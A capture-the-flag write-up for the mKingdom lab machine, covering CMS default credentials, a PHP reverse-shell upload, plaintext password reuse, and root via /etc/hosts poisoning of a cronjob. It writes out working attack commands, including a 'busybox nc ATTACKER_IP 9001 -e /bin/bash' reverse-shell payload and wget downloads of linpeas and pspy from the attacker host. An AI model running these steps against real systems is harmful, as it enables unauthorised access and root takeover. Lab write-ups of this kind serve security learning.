mKingdom

Web exploitation via PHP file upload, lateral movement through plaintext credentials, and root via cronjob hijacking through /etc/hosts poisoning.

Recon

Started with a full Nmap scan, TCP and UDP.

bash
nmap -sV -sC 10.10.219.78
nmap -sU 10.10.219.78
85HTTP
68 (UDP)DHCP client
631 (UDP)IPP
5353 (UDP)mDNS / Zeroconf

Only one HTTP port open on TCP. Navigating to http://10.10.219.78:85 showed an image. Tried steghide on it but needed a passphrase — dead end for now.

Web Enumeration

Ran gobuster to find hidden paths.

bash
gobuster dir -u http://10.10.219.78:85 -w /usr/share/wordlists/dirb/common.txt
Found
  • http://10.10.219.78:85/app/
  • http://10.10.219.78:85/app/castle — redirected from a button on the page
  • http://10.10.219.78:85/app/castle/index.php/login

A CMS login page. Tried default credentials.

Default credentials worked

admin : password

Foothold — PHP Reverse Shell

Inside the CMS, found a file extension settings page. Added .php to the allowed extensions list, then uploaded a PHP reverse shell.

bash
# On attacker machine — set up listener
nc -lvnp 4444

Triggered the shell by visiting the uploaded file. Got a basic shell back. Upgraded it to a proper TTY:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg

Found two users in /home: mario and toad.

Lateral Movement

Transferred linpeas to the target using Python's HTTP server.

bash
# On attacker machine
python3 -m http.server 8000

# On victim
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Found — toad's password in plaintext

toad : toadisthebest

bash
su toad

Re-ran linpeas as toad. Found a PWD_TOKEN environment variable containing base64-encoded text.

bash
echo "BASE64STRING" | base64 -d
Decoded to mario's password
bash
su mario

Privilege Escalation — Cronjob Hijacking

Re-ran linpeas as mario. Found that /etc/hosts was writable by our user — unusual and suspicious.

Used pspy to monitor running processes without root:

bash
# Transfer pspy to victim
wget http://ATTACKER_IP:8000/pspy64
chmod +x pspy64
./pspy64
Spotted a cronjob running every minute

The machine was pulling counter.sh from mkingdom.thm and executing it with bash as root.

The attack: poison /etc/hosts to map mkingdom.thm to our Kali machine, then serve a malicious counter.sh with a reverse shell payload.

bash
# On victim — add our IP to /etc/hosts
echo "ATTACKER_IP mkingdom.thm" >> /etc/hosts

# On attacker — create malicious counter.sh
echo "busybox nc ATTACKER_IP 9001 -e /bin/bash" > counter.sh

# Serve it
python3 -m http.server 80

# Set up listener
nc -lvnp 9001

Waited for the cronjob to fire. After ~1 minute, got a root shell.

Why busybox nc?

busybox nc is a smart fallback on restricted systems. The standard nc on the target didn't support -e, but the busybox version does. Commonly useful in CTFs, embedded devices, or containers where full toolsets aren't available.

Takeaways

Key lessons
  • Always check file upload restrictions — adding allowed extensions is a classic misconfiguration
  • pspy is essential for spotting cronjobs without root access
  • Writable /etc/hosts + outbound cronjob = almost guaranteed root
  • busybox nc as a fallback when standard netcat lacks -e
  • linpeas catches environment variables — always worth reading the full output carefully
